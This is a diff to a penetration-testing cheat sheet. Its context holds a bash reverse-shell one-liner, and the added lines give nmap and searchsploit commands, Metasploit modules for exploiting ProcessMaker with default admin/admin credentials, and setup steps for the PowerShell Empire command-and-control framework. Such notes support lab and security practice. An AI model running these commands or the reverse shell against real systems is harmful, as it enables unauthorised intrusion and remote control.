@@ -134,6 +134,33 @@ bash -i >& /dev/tcp/<ip>/<port> 0>&1
 ```
 
 ### Exploitation Frameworks
+```
+nmap -Pn -sV <ip>
+
+searchsploit process maker
+
+search processmaker
+use exploit/multi/http/processmaker_plugin_upload
+use exploit/multi/http/processmaker_exec
+```
+- Both modules require credentials - default credentials are `admin / admin`.
+
+```
+sudo apt-get update && sudo apt-get install powershell-empire starkiller -y
+
+sudo powershell-empire server
+
+sudo powershell-empire client
+listeners
+agents
+
+https://localhost:1337
+empireadmin / password123
+```
+- PowerShell-Empire (Empire)
+  - Exploitation + Post-Exploitation
+  - Primarily limited to Windows targets.
+  - https://www.kali.org/blog/empire-starkiller/ (GUI)
 
 ### Windows Exploitation
 
